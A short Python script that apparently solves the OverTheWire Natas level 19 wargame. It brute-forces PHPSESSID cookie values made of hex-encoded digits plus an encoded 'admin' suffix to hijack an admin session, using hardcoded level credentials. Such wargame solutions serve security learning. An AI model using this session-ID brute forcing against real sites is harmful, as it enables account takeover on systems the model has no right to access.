#!/usr/bin/env python
import requests
import itertools

auth=('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')

items = ['3%d' % i for i in range(10)]
common = '2d61646d696e'

s = requests.Session()
for i in range(3):
    for j in itertools.product(items, repeat=(i+1)):
        s.cookies.set('PHPSESSID', '%s%s' % (''.join(j), common))
        r = s.get('http://natas19.natas.labs.overthewire.org/index.php?debug=1&username=admin&password=admin', auth=auth)
        if not "regular user" in r.text:
            print r.text
            break
